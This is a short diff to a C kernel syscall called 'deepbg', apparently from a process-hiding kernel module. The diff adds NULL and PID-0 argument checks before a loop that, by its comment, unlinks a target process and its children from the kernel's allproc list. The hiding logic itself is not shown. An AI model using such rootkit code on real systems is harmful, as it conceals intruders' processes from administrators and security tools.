@@ -32,9 +32,21 @@ static int deepbg(struct thread *td, void *syscall_args)
 {
    struct deepbg_args *uap;
    uap = (struct deepbg_args *)syscall_args;
-   struct proc     *p, *prev = NULL;
+   struct proc *p, *prev = NULL;
    struct proc **oldprev = NULL;
    bool target_found;
+
+   if (uap == NULL) {
+#ifdef DEBUG
+      uprintf("[x] arguments are NULL\n");
+#endif
+      return 1;
+   } else if (uap->p_pid == 0) {
+#ifdef DEBUG
+      uprintf("[x] Cannot hide kernel process\n");
+#endif
+      return 2;
+   }
 
    /* Loop until the target process and children have all
     * been removed from the allproc list
